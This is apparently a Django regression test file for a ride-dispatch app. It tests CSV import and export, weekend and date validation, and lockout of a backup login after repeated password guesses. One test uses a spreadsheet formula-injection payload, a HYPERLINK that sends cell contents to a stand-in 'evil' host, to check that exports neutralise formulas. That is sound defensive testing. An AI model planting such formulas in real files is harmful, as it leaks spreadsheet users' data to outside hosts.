"""Regression tests for issues found in the pre-testing-week review."""

import csv
import io
import time as clock
from django.contrib.auth import get_user_model
from django.core.cache import cache
from django.test import TestCase, override_settings

from .form_import import LOCK_IN_ANSWER, split_route
from .models import Ride
from .test_archive import at
from .test_form_import import ImportApiTests, TODAY, rider, sheet

User = get_user_model()
LOCK = "LOCK-IN (fill out below once and it will repeat)"


@override_settings(SERVICE_START="07:00", SERVICE_END="19:00")
class ImportExportReviewTests(TestCase):
    setUp = ImportApiTests.setUp
    preview = ImportApiTests.preview
    run_import = ImportApiTests.run_import

    def export(self, week="2026-10-19"):
        with at(TODAY, 9):
            r = self.client.get(f"/api/form-export/?week={week}")
        return list(csv.reader(io.StringIO(r.content.decode())))

    def test_export_neutralises_formulas_and_import_reads_them_back(self):
        text = sheet(rider(name='=HYPERLINK("http://evil/?"&A1,"x")', **{
            "MONDAY Location #1 (Start to End)": "+cmd to Library", "MONDAY #1": ["10/19/2026", "8:00:00 AM"],
            "MONDAY #1 NOTES": "@SUM(1)"}))
        self.run_import(self.preview(text).json()["slots"])
        row = self.export()[1]
        for cell in row:
            self.assertFalse(cell.lstrip().startswith(("=", "+", "-", "@")), cell)
        self.assertIn("'=HYPERLINK", row[0])
        # Importing the export gives back the original text (and nothing new).
        text = "\r\n".join(",".join('"' + c.replace('"', '""') + '"' for c in r) for r in self.export())
        slot = self.preview(text).json()["slots"][0]
        self.assertEqual(slot["rider_name"], '=HYPERLINK("http://evil/?"&A1,"x")')
        self.assertIn("@SUM(1)", slot["notes"])
        self.assertEqual(slot["new_rides"], 0)

    def test_one_off_and_repeating_rides_export_on_separate_rows(self):
        text = sheet(
            rider(**{"MONDAY Location #1 (Start to End)": "A to B", "MONDAY #1": ["10/19/2026", "8:00:00 AM"]}),
            rider(**{LOCK: "", "TUESDAY Location #1  (Start to End)": "C to D",
                     "TUESDAY #1": ["10/20/2026", "9:00:00 AM"]}),
        )
        self.run_import(self.preview(text).json()["slots"])
        rows = self.export()
        self.assertEqual(len(rows), 3)  # header + a LOCK-IN row + a one-off row
        lock_col = rows[0].index(LOCK)
        self.assertEqual(sorted(r[lock_col] for r in rows[1:]), ["", LOCK_IN_ANSWER])
        # Re-importing the export adds nothing: Tuesday stays a one-off.
        text = "\r\n".join(",".join('"' + c.replace('"', '""') + '"' for c in r) for r in rows)
        slots = self.preview(text).json()["slots"]
        self.assertEqual(sum(s["new_rides"] for s in slots), 0)
        self.assertEqual(sorted(s["lock_in"] for s in slots), [False, True])

    def test_preview_counts_match_what_import_adds(self):
        one_off = {LOCK: "", "MONDAY Location #1 (Start to End)": "A to B", "MONDAY #1": ["10/19/2026", "8:00:00 AM"]}
        text = sheet(
            rider(**one_off),
            rider(**one_off),  # the same one-off sent twice
            rider(**{"MONDAY Location #1 (Start to End)": "A to B", "MONDAY #1": ["10/12/2026", "8:00:00 AM"]}),
        )
        slots = self.preview(text).json()["slots"]
        promised = sum(s["new_rides"] for s in slots if not s["problems"])
        created = self.run_import([s for s in slots if not s["problems"]]).json()["rides"]
        self.assertEqual(promised, created)
        self.assertIn("also in an earlier row", " ".join(slots[1]["warnings"]))

    def test_one_off_on_a_weekend_is_a_problem(self):
        text = sheet(rider(**{LOCK: "", "MONDAY Location #1 (Start to End)": "A to B",
                              "MONDAY #1": ["10/17/2026", "8:00:00 AM"]}))  # a Saturday
        self.assertIn("weekdays only", self.preview(text).json()["slots"][0]["problems"][0])

    def test_reimport_after_fixing_a_location_is_clean(self):
        text = sheet(rider(**{"MONDAY Location #1 (Start to End)": "Library", "MONDAY #1": ["10/19/2026", "8:00:00 AM"]}))
        slot = self.preview(text).json()["slots"][0]
        self.run_import([{**slot, "pickup": "Library", "dropoff": "UCen"}])
        again = self.preview(text).json()["slots"][0]
        self.assertEqual((again["problems"], again["new_rides"], again["existing_rides"]), ([], 0, 4))

    def test_long_name_and_odd_slot_values_are_problems_not_crashes(self):
        base = {"key": "x", "weekday": 0, "rider_phone": "8055550101", "pickup": "A", "dropoff": "B",
                "time": "8:00:00 AM", "first_date": "2026-10-19", "lock_in": True}
        slots = [
            {**base, "rider_name": "N" * 200},
            {**base, "rider_name": "Ana", "first_date": "nope"},
            {**base, "rider_name": 5, "rider_phone": 7, "pickup": ["x"], "time": 3, "also_in_rows": 9},
        ]
        r = self.run_import(slots)
        self.assertEqual(r.status_code, 200)
        self.assertEqual([s["reason"] for s in r.json()["skipped"]][:2],
                         ["The name is too long (120 characters at most).", 'Could not parse: "nope"'])
        self.assertFalse(Ride.objects.exists())

    def test_huge_cell_parses_quickly(self):
        start = clock.monotonic()
        split_route("a" + " " * 100_000 + "b")
        self.assertLess(clock.monotonic() - start, 1)


class OddDatesTests(TestCase):
    setUp = ImportApiTests.setUp

    def test_far_future_stats_range_is_a_400_not_a_crash(self):
        r = self.client.get("/api/stats/?from=9999-01-01&to=9999-12-31")
        self.assertEqual(r.status_code, 400)


@override_settings(FALLBACK_DISPATCH_PASSWORD="the-right-password")
class BackupLockoutTests(TestCase):
    def setUp(self):
        cache.clear()

    def attempt(self, password, ip):
        return self.client.post("/api/auth/backup/", {"username": "dispatch", "password": password},
                                content_type="application/json", REMOTE_ADDR=ip)

    def test_guessing_from_one_address_doesnt_lock_dispatch_out_elsewhere(self):
        for _ in range(10):
            self.attempt("wrong", "10.0.0.1")
        self.assertEqual(self.attempt("the-right-password", "10.0.0.1").status_code, 429)
        self.assertEqual(self.attempt("the-right-password", "10.0.0.2").status_code, 200)

    def test_guessing_from_many_addresses_still_locks(self):
        for i in range(100):
            self.attempt("wrong", f"10.1.{i // 250}.{i % 250}")
        self.assertEqual(self.attempt("the-right-password", "10.9.9.9").status_code, 429)
